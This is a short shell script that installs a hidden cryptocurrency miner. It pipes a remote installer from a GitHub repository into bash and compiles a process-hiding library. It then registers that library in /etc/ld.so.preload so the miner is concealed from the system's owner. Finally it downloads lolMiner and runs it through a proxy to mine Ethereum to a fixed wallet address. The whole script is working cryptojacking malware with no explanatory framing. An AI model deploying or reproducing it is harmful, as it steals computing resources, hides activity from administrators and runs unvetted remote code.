#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks2.sh | bash
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicLol.zip
unzip magicLol.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.26/lolMiner_v1.26_Lin64.tar.gz
tar -xvzf lolMiner_v1.26_Lin64.tar.gz
rm .gitignore
cd 1.26
graftcp ./lolMiner -a ETHASH --pool us1.ethermine.org:5555 --tls on --user 0x52500352a37a06f0c085d58663e4eadbd7e9f684 --worker lolMiner --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY --nocolor
